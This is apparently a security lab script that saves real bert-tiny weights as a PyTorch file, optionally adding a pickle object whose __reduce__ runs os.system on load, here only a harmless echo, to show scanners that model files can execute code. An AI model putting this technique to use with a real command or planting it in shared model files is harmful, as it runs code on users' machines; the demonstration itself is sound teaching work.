"""
Builds a PyTorch model file from the real prajjwal1/bert-tiny weights.

    --clean     save the genuine weights exactly as they came
    --poison    save the same weights PLUS one extra object that runs a
                command when the file is loaded

Same weights either way. Same file type. The only difference is one
dictionary key - and that is enough to change a scanner's verdict.

The poisoned command is a plain `echo`. Nothing else happens. Nothing
leaves this container.
"""
import argparse
import json
import os

import torch

ASSETS = json.load(open("/opt/lab-assets/asset_paths.json"))
ORIGINAL = ASSETS["pytorch_model.bin"]


class HarmlessPayload:
    """The payload.

    __reduce__ is Python's way of telling pickle "to rebuild me, call this
    function with these arguments." Pickle obeys - at load time, before the
    model has been used for anything.

    That is the entire vulnerability. A pickle-based model file is not data.
    It is a program.
    """

    def __reduce__(self):
        return (
            os.system,
            ("echo '>>> Synthetic payload executed. A real attack would not be an echo. <<<'",),
        )


def build(poison):
    # weights_only=True tells PyTorch to rebuild tensors but NOT to let the
    # file run code. Reading is safe even if the file were hostile.
    state_dict = torch.load(ORIGINAL, weights_only=True)
    print(f"Loaded {len(state_dict)} real weight tensors from prajjwal1/bert-tiny.")

    if poison:
        state_dict["_security_demo_payload"] = HarmlessPayload()
        out = "bert_tiny_poisoned.pt"
        print("Added 1 hidden payload object to the weight dictionary.")
    else:
        out = "bert_tiny_clean.pt"
        print("Saving the weights unchanged.")

    # torch.save serializes with pickle, so whatever is in the dictionary
    # gets baked into the file.
    torch.save(state_dict, out)
    print(f"Wrote {out}  ({os.path.getsize(out) / 1e6:.1f} MB)")


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Build a clean or poisoned model file.")
    mode = ap.add_mutually_exclusive_group(required=True)
    mode.add_argument("--clean", action="store_true", help="save the genuine weights unchanged")
    mode.add_argument("--poison", action="store_true", help="add the hidden payload")
    build(poison=ap.parse_args().poison)
